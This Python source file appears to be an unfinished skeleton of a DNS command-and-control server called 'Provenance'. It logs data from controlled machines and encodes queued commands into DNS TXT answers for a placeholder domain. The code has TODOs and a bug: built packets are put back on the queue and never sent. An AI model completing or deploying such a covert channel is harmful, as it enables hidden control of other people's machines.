import dnslib
from socketserver import UDPServer, BaseRequestHandler
import threading

class Machine(BaseRequestHandler):
    """ This represents a machine being controlled by Provenance"""


    def __init__(self, request, client_address, server, name):
        self.server = server
        self.request = request
        self.client_address = client_address
        self.name = name
        self.ip = client_address[0]
        self.active = False
        self.record_type = "TXT"
        self.queued_commands = []
        self.sent_commands = []
        # this just calls handle
        # super().__init__(request, client_address, server)
    
    def __repr__(self):
        return f"{self.name}{{{self.ip}, {self.record_type}}}"

    def handle(self):
        data = self.request[0]
        addr, port = self.client_address
        print(f"Data Received From {self.name}:", data)

    def queue_cmd(self, cmd):
        self.queued_commands.append(cmd)

    def send_cmd(self):
        if not self.queued_commands:
            # TODO: send Nop
            return

        # TODO: use dictionary switch to encode different packets
        cmd = self.queued_commands.pop()
        # Generate skeleton question for packet
        question = dnslib.DNSRecord.question(
            qname="fakedomain.com",
            qtype='TXT',
            qclass='IN')
        # Generate the response to the question
        command_packet = question.reply() 
        command_packet.add_answer(
            dnslib.RR(
                rname="fakedomain.com",
				rtype=dnslib.QTYPE.TXT,
                rclass=dnslib.CLASS.IN,
				rdata=dnslib.TXT(cmd),
                ttl=1337 ))
        self.queued_commands.append(command_packet)

